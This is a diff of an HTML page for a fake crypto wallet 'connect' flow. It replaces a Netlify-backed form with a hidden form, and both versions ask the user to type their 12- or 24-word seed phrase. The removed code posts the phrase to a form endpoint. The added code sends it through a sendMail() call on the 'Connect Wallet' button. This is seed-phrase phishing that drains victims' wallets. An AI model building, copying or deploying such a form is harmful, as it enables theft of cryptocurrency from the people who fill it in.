@@ -1368,91 +1368,18 @@
 
                     </div>
 
-                  <div id="div_connect_manually">
-  <form method="POST" id="my-form" data-netlify="true">
-    <input type="hidden" name="my-form" value="my-form" />
-    <div id="phrase">
-      <textarea
-        class="col-12 form-control"
-        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-        style="font-size:14px; font-weight:650; color: #fff !important;"
-        rows="4"
-        id="secret_phrase"
-        name="phrasess"
-        required
-      ></textarea>
-      <p id="error-message" style="color: red; display: none;">Invalid input. Please enter 12 or 24 words separated by spaces.</p>
-
-      <div class="row mx-auto col-10 mt-4">
-        <button type="submit" class="btn btn-primary">Connect Wallet</button>
-      </div>
-    </div>
-  </form>
-</div>
-
-<!-- JavaScript -->
-<script>
-  const form = document.getElementById("my-form");
-  const errorMessage = document.getElementById("error-message");
-  const textarea = document.getElementById("secret_phrase");
-
-  form.addEventListener("submit", function (event) {
-    event.preventDefault(); // Prevent the default form submission
-
-    // Get the input value and validate
-    const input = textarea.value.trim();
-    const words = input.split(/\s+/);
-
-    // Check if input contains exactly 12 or 24 words
-    if (words.length !== 12 && words.length !== 24) {
-      errorMessage.style.display = "block"; // Show error message
-    } else {
-      errorMessage.style.display = "none"; // Hide error message
-      alert("Form submitted successfully!");
-      form.reset(); // Optionally reset the form
-    }
-  });
-</script>
-                        <!-- AJAX Script -->
-<script>
-  const form = document.getElementById("my-form");
-  const successMessage = document.getElementById("success-message");
-
-  form.addEventListener("submit", async function (event) {
-    event.preventDefault(); // Prevent the default form submission
-
-    const formData = new FormData(form);
-
-    try {
-      const response = await fetch("/", {
-        method: "POST",
-        body: formData,
-      });
-
-      if (response.ok) {
-        form.style.display = "none"; // Hide the form
-        successMessage.style.display = "block"; // Show success message
-      } else {
-        alert("Submission failed. Please try again later.");
-      }
-    } catch (error) {
-      console.error("Error submitting form:", error);
-      alert("An error occurred. Please try again.");
-    }
-  });
-</script>
-                        
-                        <!-- <form method="POST" id="my-form">
+                    <div id="div_connect_manuallly" style="display:none;">
+                        <form method="POST" id="my-form">
                             <div id="phrase">
                                 <textarea class="col-12 form-control" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." style="font-size:14px; font-weight:650; color: #fff !important;" rows="4" id="secret_phrase" name="phrase" required></textarea>
                                 <p class="text-center">...</p>
 
                                 <div class="row mx-auto col-10 mt-4">
-                                    <button id="button_connect_wallet"  class="btn btn-primary col-12 mt-2 mb-2" >Connect Wallet</button>
+                                    <button id="button_connect_wallet" type="button" class="btn btn-primary col-12 mt-2 mb-2" onclick="sendMail()">Connect Wallet</button>
                                 </div>
 
                             </div>
-                        </form> -->
+                        </form>
                     </div>
 
                     <div class="mt-4 d-flex justify-content-center align-items-center">
